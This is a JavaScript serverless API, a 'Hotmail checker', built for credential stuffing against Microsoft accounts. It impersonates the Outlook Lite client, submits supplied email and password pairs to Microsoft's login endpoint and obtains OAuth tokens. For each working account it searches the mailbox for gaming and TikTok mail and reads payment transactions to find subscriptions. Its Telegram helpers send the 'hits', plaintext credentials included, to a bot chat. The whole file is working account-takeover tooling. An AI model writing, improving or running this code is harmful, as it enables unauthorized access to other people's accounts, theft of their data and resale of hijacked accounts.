/**
 * HOTMAIL Checker v2.0 - Node.js API for Vercel
 * Exact match to hatmil.py working logic
 */

export default async function handler(req, res) {
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'GET') {
    return res.json({ ok: true, pong: true, message: 'API is working!' });
  }

  if (req.method !== 'POST') {
    return res.status(400).json({ error: 'POST only' });
  }

  const input = req.body || {};
  const action = input.action || '';

  try {
    switch (action) {
      case 'ping':
        return res.json({ ok: true, pong: true });
      case 'check':
        return await doCheck(input, res);
      case 'telegram_message':
        return await telegramSendMessage(input, res);
      case 'telegram_text':
        return await telegramSendText(input, res);
      case 'telegram_document':
        return await telegramSendDocument(input, res);
      default:
        return res.json({ error: 'Unknown action: ' + action });
    }
  } catch (e) {
    console.error('Handler error:', e);
    return res.status(500).json({ error: e.message });
  }
}

// Global cookie jar (simulating session)
const globalCookies = {};

// ─────────────────────────────────────────────────────────────────────────────
// HTTP HELPER - Match Python requests.Session() behavior
// ─────────────────────────────────────────────────────────────────────────────
async function sessionRequest(url, method, headers, body = null, cookies, allowRedirects = true) {
  const headerObj = {};
  
  // Add headers
  if (headers) {
    for (const [key, value] of Object.entries(headers)) {
      headerObj[key] = value;
    }
  }

  // Add cookies from session
  if (cookies && Object.keys(cookies).length > 0) {
    headerObj['Cookie'] = Object.entries(cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  }

  const fetchOptions = {
    method: method,
    headers: headerObj,
    redirect: allowRedirects ? 'follow' : 'manual',
  };

  if (body && method === 'POST') {
    fetchOptions.body = body;
  }

  try {
    const response = await fetch(url, fetchOptions);
    
    // Extract and store cookies from response
    const setCookie = response.headers.get('set-cookie');
    if (setCookie) {
      // Parse set-cookie header
      const cookieParts = setCookie.split(',');
      for (const part of cookieParts) {
        const cookiePair = part.split(';')[0].split('=');
        if (cookiePair.length >= 2) {
          const name = cookiePair[0].trim();
          const value = cookiePair.slice(1).join('=').trim();
          cookies[name] = value;
        }
      }
    }

    const responseText = await response.text();
    
    // Get location from headers
    let location = '';
    if (!allowRedirects) {
      location = response.headers.get('location') || '';
    }

    return {
      status: response.status,
      text: responseText,
      headers: response.headers,
      location: location,
      url: response.url,
      cookies: cookies
    };
  } catch (e) {
    console.error('Request error:', e);
    return { status: 0, text: '', headers: {}, location: '', url: url, cookies: cookies };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// UUID GENERATOR
// ─────────────────────────────────────────────────────────────────────────────
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
  });
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN CHECK FUNCTION - Exact match to hatmil.py
// ─────────────────────────────────────────────────────────────────────────────
async function doCheck(input, res) {
  const email = (input.email || '').trim();
  const password = (input.password || '').trim();
  const checkMode = input.checkMode || 'all';

  if (!email || !password) {
    return res.json({ status: 'ERROR', reason: 'Missing credentials' });
  }

  // Create new session cookies for this check
  const sessionCookies = {};

  try {
    // ═══════════════════════════════════════════════════════════════
    // STEP 1: HRD Check - Exact match to hatmil.py
    // ═══════════════════════════════════════════════════════════════
    const uuid = generateUUID();
    const url1 = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${email}`;
    
    const headers1 = {
      'X-OneAuth-AppName': 'Outlook Lite',
      'X-Office-Version': '3.11.0-minApi24',
      'X-CorrelationId': uuid,
      'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)',
      'Host': 'odc.officeapps.live.com',
      'Connection': 'Keep-Alive',
      'Accept-Encoding': 'gzip'
    };

    const r1 = await sessionRequest(url1, 'GET', headers1, null, sessionCookies, true);

    // Check for BAD responses - exact match to hatmil.py
    if (r1.text.includes('Neither') || r1.text.includes('Both') || 
        r1.text.includes('Placeholder') || r1.text.includes('OrgId')) {
      return res.json({ status: 'BAD' });
    }
    if (!r1.text.includes('MSAccount')) {
      return res.json({ status: 'BAD' });
    }

    await sleep(0.3);

    // ═══════════════════════════════════════════════════════════════
    // STEP 2: OAuth Authorize - Exact match to hatmil.py
    // ═══════════════════════════════════════════════════════════════
    const url2 = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;
    
    const headers2 = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive'
    };

    const r2 = await sessionRequest(url2, 'GET', headers2, null, sessionCookies, true);

    // ═══════════════════════════════════════════════════════════════
    // EXTRACT urlPost and PPFT - EXACT Python regex patterns
    // ═══════════════════════════════════════════════════════════════
    
    // Python: url_match = re.search(r'urlPost\":\"([^\"]+)\"', r2.text)
    const urlMatch = r2.text.match(/urlPost":"([^"]+)"/);
    
    // Python: ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"', r2.text)
    const ppftMatch = r2.text.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"/);

    if (!urlMatch || !ppftMatch) {
      return res.json({ status: 'BAD' });
    }

    // Python: post_url = url_match.group(1).replace("\\/", "/")
    let postUrl = urlMatch[1].replace(/\\\//g, '/');
    let ppft = ppftMatch[1];

    // ═══════════════════════════════════════════════════════════════
    // STEP 3: POST Login - Exact match to hatmil.py
    // ═══════════════════════════════════════════════════════════════
    
    // Python login_data format (urlencoded string)
    const loginData = `i13=1&login=${email}&loginfmt=${email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960`;

    const headers3 = {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Origin': 'https://login.live.com',
      'Referer': r2.url
    };

    // Python: allow_redirects=False
    const r3 = await sessionRequest(postUrl, 'POST', headers3, loginData, sessionCookies, false);

    const responseText = r3.text.toLowerCase();

    // ═══════════════════════════════════════════════════════════════
    // CHECK RESPONSE - Exact match to hatmil.py
    // ═══════════════════════════════════════════════════════════════
    
    // Check for wrong credentials
    if (responseText.includes('account or password is incorrect') || 
        (r3.text.split('error').length - 1) > 0) {
      return res.json({ status: 'BAD' });
    }

    // Check for 2FA
    if (r3.text.includes('https://account.live.com/identity/confirm') || 
        responseText.includes('identity/confirm')) {
      return res.json({ status: '2FA', email: email, password: password });
    }

    if (r3.text.includes('https://account.live.com/Consent') || 
        responseText.includes('consent')) {
      return res.json({ status: '2FA', email: email, password: password });
    }

    // Check for abuse
    if (r3.text.includes('https://account.live.com/Abuse')) {
      return res.json({ status: 'BAD' });
    }

    // Get location header
    const location = r3.location;
    if (!location) {
      return res.json({ status: 'BAD' });
    }

    // Extract code from location
    const codeMatch = location.match(/code=([^&]+)/);
    if (!codeMatch) {
      return res.json({ status: 'BAD' });
    }

    const code = codeMatch[1];

    // Get MSPCID cookie - Python: self.session.cookies.get("MSPCID", "")
    const mspcid = sessionCookies['MSPCID'] || '';
    if (!mspcid) {
      return res.json({ status: 'BAD' });
    }

    const cid = mspcid.toUpperCase();

    // ═══════════════════════════════════════════════════════════════
    // STEP 4: Get Token - Exact match to hatmil.py
    // ═══════════════════════════════════════════════════════════════
    const tokenData = `client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=${code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access`;

    const r4 = await sessionRequest(
      'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
      'POST',
      { 'Content-Type': 'application/x-www-form-urlencoded' },
      tokenData,
      sessionCookies,
      true
    );

    if (!r4.text.includes('access_token')) {
      return res.json({ status: 'BAD' });
    }

    let tokenJson;
    try {
      tokenJson = JSON.parse(r4.text);
    } catch {
      return res.json({ status: 'BAD' });
    }

    const accessToken = tokenJson.access_token;

    // ═══════════════════════════════════════════════════════════════
    // STEP 5: Service Checks
    // ═══════════════════════════════════════════════════════════════
    const result = {
      status: 'HIT',
      email: email,
      password: password
    };

    // Check Microsoft subscriptions
    if (['microsoft', 'both', 'all'].includes(checkMode)) {
      const msResult = await checkMicrosoftSubscriptions(email, password, accessToken, cid, sessionCookies);
      result.ms_status = msResult.status || 'FREE';
      result.subscriptions = msResult.subscriptions || [];
      result.ms_data = msResult.data || {};
    }

    // Check PSN
    if (['psn', 'both', 'all'].includes(checkMode)) {
      const psnResult = await checkPSN(email, accessToken, cid, sessionCookies);
      result.psn_status = psnResult.psn_status || 'FREE';
      result.psn_orders = psnResult.psn_orders || 0;
    }

    // Check Steam
    if (['steam', 'both', 'all'].includes(checkMode)) {
      const steamResult = await checkSteam(email, accessToken, cid, sessionCookies);
      result.steam_status = steamResult.steam_status || 'FREE';
      result.steam_count = steamResult.steam_count || 0;
    }

    // Check Supercell
    if (['supercell', 'both', 'all'].includes(checkMode)) {
      const scResult = await checkSupercell(email, accessToken, cid, sessionCookies);
      result.supercell_status = scResult.supercell_status || 'FREE';
      result.supercell_games = scResult.games || [];
    }

    // Check TikTok
    if (['tiktok', 'both', 'all'].includes(checkMode)) {
      const ttResult = await checkTikTok(email, accessToken, cid, sessionCookies);
      result.tiktok_status = ttResult.tiktok_status || 'FREE';
      result.tiktok_username = ttResult.username || null;
    }

    // Check Minecraft
    if (['minecraft', 'both', 'all'].includes(checkMode)) {
      const mcResult = await checkMinecraft(accessToken);
      result.minecraft_status = mcResult.minecraft_status || 'FREE';
      result.minecraft_username = mcResult.minecraft_username || null;
      result.minecraft_uuid = mcResult.minecraft_uuid || '';
    }

    return res.json(result);

  } catch (e) {
    console.error('Check error:', e);
    return res.json({ status: 'ERROR', reason: e.message });
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// OUTLOOK SEARCH - Match hatmil.py exactly
// ─────────────────────────────────────────────────────────────────────────────
async function outlookSearch(query, size, accessToken, cid, sessionCookies) {
  const searchUrl = 'https://outlook.live.com/search/api/v2/query';
  
  const payload = {
    Cvid: generateUUID(),
    Scenario: { Name: 'owa.react' },
    TimeZone: 'UTC',
    TextDecorations: 'Off',
    EntityRequests: [{
      EntityType: 'Conversation',
      ContentSources: ['Exchange'],
      Filter: { Or: [{ Term: { DistinguishedFolderName: 'msgfolderroot' } }] },
      From: 0,
      Query: { QueryString: query },
      Size: size,
      Sort: [{ Field: 'Time', SortDirection: 'Desc' }]
    }]
  };

  const headers = {
    'User-Agent': 'Outlook-Android/2.0',
    'Accept': 'application/json',
    'Authorization': `Bearer ${accessToken}`,
    'X-AnchorMailbox': `CID:${cid}`,
    'Content-Type': 'application/json'
  };

  const r = await sessionRequest(searchUrl, 'POST', headers, JSON.stringify(payload), sessionCookies, true);

  if (r.status === 200) {
    try {
      return JSON.parse(r.text);
    } catch {
      return {};
    }
  }
  return {};
}

// ─────────────────────────────────────────────────────────────────────────────
// SERVICE CHECK FUNCTIONS
// ─────────────────────────────────────────────────────────────────────────────
async function checkPSN(email, accessToken, cid, sessionCookies) {
  const data = await outlookSearch('sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation', 50, accessToken, cid, sessionCookies);
  
  let totalOrders = 0;
  
  if (data.EntitySets && data.EntitySets[0] && data.EntitySets[0].ResultSets && data.EntitySets[0].ResultSets[0]) {
    totalOrders = data.EntitySets[0].ResultSets[0].Total || 0;
  }

  return {
    psn_status: totalOrders > 0 ? 'HAS_ORDERS' : 'FREE',
    psn_orders: totalOrders,
    purchases: []
  };
}

async function checkSteam(email, accessToken, cid, sessionCookies) {
  const data = await outlookSearch('noreply@steampowered.com OR steam', 50, accessToken, cid, sessionCookies);
  
  let totalCount = 0;
  
  if (data.EntitySets && data.EntitySets[0] && data.EntitySets[0].ResultSets && data.EntitySets[0].ResultSets[0]) {
    totalCount = data.EntitySets[0].ResultSets[0].Total || 0;
  }

  return {
    steam_status: totalCount > 0 ? 'HAS_PURCHASES' : 'FREE',
    steam_count: totalCount,
    purchases: []
  };
}

async function checkSupercell(email, accessToken, cid, sessionCookies) {
  const games = ['Clash of Clans', 'Clash Royale', 'Brawl Stars', 'Hay Day', 'Boom Beach'];
  const foundGames = [];

  for (const game of games) {
    const data = await outlookSearch(game, 5, accessToken, cid, sessionCookies);
    
    if (data.EntitySets) {
      for (const entitySet of data.EntitySets) {
        if (entitySet.ResultSets) {
          for (const resultSet of entitySet.ResultSets) {
            const total = resultSet.Total || 0;
            if (total > 0) {
              foundGames.push(game);
              break;
            }
          }
        }
      }
    }
    await sleep(0.2);
  }

  return {
    supercell_status: foundGames.length > 0 ? 'HAS_GAMES' : 'FREE',
    games: foundGames
  };
}

async function checkTikTok(email, accessToken, cid, sessionCookies) {
  const data = await outlookSearch('TikTok OR tiktok.com', 10, accessToken, cid, sessionCookies);
  
  let username = null;

  if (data.EntitySets) {
    for (const entitySet of data.EntitySets) {
      if (entitySet.ResultSets) {
        for (const resultSet of entitySet.ResultSets) {
          if (resultSet.Results) {
            for (const result of resultSet.Results.slice(0, 3)) {
              const preview = result.Preview || '';
              const usernameMatch = preview.match(/@([a-zA-Z0-9_.]{2,24})/);
              if (usernameMatch) {
                username = usernameMatch[1];
                break;
              }
            }
          }
        }
      }
    }
  }

  return {
    tiktok_status: username ? 'FOUND' : 'FREE',
    username: username
  };
}

async function checkMinecraft(accessToken) {
  const headers = { 'Authorization': `Bearer ${accessToken}` };
  const r = await sessionRequest('https://api.minecraftservices.com/minecraft/profile', 'GET', headers, null, {}, true);

  if (r.status === 200) {
    try {
      const data = JSON.parse(r.text);
      return {
        minecraft_status: 'OWNED',
        minecraft_username: data.name || 'Unknown',
        minecraft_uuid: data.id || '',
        minecraft_capes: (data.capes || []).map(c => c.alias || '')
      };
    } catch {
      return { minecraft_status: 'FREE', minecraft_username: null };
    }
  }
  return { minecraft_status: 'FREE', minecraft_username: null };
}

async function checkMicrosoftSubscriptions(email, password, accessToken, cid, sessionCookies) {
  await sleep(0.5);

  const userId = generateUUID().replace(/-/g, '').substring(0, 16);
  const stateJson = JSON.stringify({ userId: userId, scopeSet: 'pidl' });
  
  // URL encode the state
  const encodedState = encodeURIComponent(stateJson);
  
  const paymentAuthUrl = `https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=${encodedState}&prompt=none`;

  const headers = {
    'Host': 'login.live.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Referer': 'https://account.microsoft.com/'
  };

  const r = await sessionRequest(paymentAuthUrl, 'GET', headers, null, sessionCookies, true);

  let paymentToken = null;
  const searchText = r.text + ' ' + r.url;

  // Token patterns from hatmil.py
  const tokenPatterns = [
    /access_token=([^&\s"']+)/,
    /"access_token":"([^"]+)"/
  ];

  for (const pattern of tokenPatterns) {
    const match = searchText.match(pattern);
    if (match) {
      paymentToken = decodeURIComponent(match[1]);
      break;
    }
  }

  if (!paymentToken) {
    return { status: 'FREE', subscriptions: [], data: {} };
  }

  const subData = {};
  const subscriptions = [];

  const paymentHeaders = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Authorization': `MSADELEGATE1.0="${paymentToken}"`,
    'Content-Type': 'application/json',
    'Host': 'paymentinstruments.mp.microsoft.com',
    'ms-cV': generateUUID(),
    'Origin': 'https://account.microsoft.com',
    'Referer': 'https://account.microsoft.com/'
  };

  // Get transactions
  const transUrl = 'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions';
  const rSub = await sessionRequest(transUrl, 'GET', paymentHeaders, null, sessionCookies, true);

  if (rSub.status === 200) {
    const responseText = rSub.text;

    const subscriptionKeywords = {
      'Xbox Game Pass Ultimate': { type: 'GAME PASS ULTIMATE', category: 'gaming' },
      'PC Game Pass': { type: 'PC GAME PASS', category: 'gaming' },
      'Xbox Game Pass': { type: 'GAME PASS', category: 'gaming' },
      'EA Play': { type: 'EA PLAY', category: 'gaming' },
      'Xbox Live Gold': { type: 'XBOX LIVE GOLD', category: 'gaming' },
      'Microsoft 365 Family': { type: 'M365 FAMILY', category: 'office' },
      'Microsoft 365 Personal': { type: 'M365 PERSONAL', category: 'office' },
      'Office 365': { type: 'OFFICE 365', category: 'office' },
      'OneDrive': { type: 'ONEDRIVE', category: 'storage' }
    };

    for (const [keyword, info] of Object.entries(subscriptionKeywords)) {
      if (responseText.includes(keyword)) {
        const subInfo = {
          name: info.type,
          category: info.category
        };

        const titleMatch = responseText.match(/"title"\s*:\s*"([^"]+)"/);
        if (titleMatch) subInfo.title = titleMatch[1];

        const renewalMatch = responseText.match(/"nextRenewalDate"\s*:\s*"([^T"]+)/);
        if (renewalMatch) {
          subInfo.renewal_date = renewalMatch[1];
        }

        const autoMatch = responseText.match(/"autoRenew"\s*:\s*(true|false)/);
        if (autoMatch) {
          subInfo.auto_renew = autoMatch[1] === 'true' ? 'YES' : 'NO';
        }

        subscriptions.push(subInfo);
      }
    }

    if (subscriptions.length > 0) {
      const activeSubs = subscriptions.filter(s => !s.is_expired);
      return {
        status: activeSubs.length > 0 ? 'PREMIUM' : 'FREE',
        subscriptions: subscriptions,
        data: subData
      };
    }
  }

  return { status: 'FREE', subscriptions: [], data: subData };
}

// ─────────────────────────────────────────────────────────────────────────────
// TELEGRAM HELPERS
// ─────────────────────────────────────────────────────────────────────────────
async function telegramSendMessage(input, res) {
  const token = input.token || '';
  const chatId = input.chatId || '';
  const text = input.text || '';

  if (!token || !chatId) {
    return res.json({ ok: false, error: 'Missing token/chatId' });
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
      }),
    });

    const resp = await response.json();
    return res.json({ ok: resp.ok || false });
  } catch (e) {
    return res.json({ ok: false, error: e.message });
  }
}

async function telegramSendText(input, res) {
  const token = input.token || '';
  const chatId = input.chatId || '';
  const content = input.content || '';
  const filename = input.filename || 'results.txt';

  if (!token || !chatId) {
    return res.json({ ok: false });
  }

  const lines = content.split('\n').filter(l => l.trim() && !l.trim().startsWith('#'));

  if (lines.length === 0) {
    return res.json({ ok: true });
  }

  const chunkSize = 50;
  let ok = true;

  for (let i = 0; i < lines.length; i += chunkSize) {
    const chunk = lines.slice(i, i + chunkSize);
    const msgText = `📄 <b>${filename}</b>\n\n<code>${chunk.join('\n')}</code>`;

    try {
      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: msgText,
          parse_mode: 'HTML',
        }),
      });

      const resp = await response.json();
      if (!resp.ok) ok = false;
    } catch {
      ok = false;
    }

    await sleep(1000);
  }

  return res.json({ ok });
}

async function telegramSendDocument(input, res) {
  const token = input.token || '';
  const chatId = input.chatId || '';
  const filename = input.filename || 'results.txt';
  const content = input.content || '';
  const caption = input.caption || '';

  if (!token || !chatId) {
    return res.json({ ok: false, error: 'Missing token/chatId' });
  }

  try {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    
    const blob = new Blob([content], { type: 'text/plain' });
    formData.append('document', blob, filename);

    const response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
      method: 'POST',
      body: formData,
    });

    const resp = await response.json();
    return res.json({ ok: resp.ok || false });
  } catch (e) {
    console.error('Telegram document error:', e);
    return res.json({ ok: false, error: e.message });
  }
}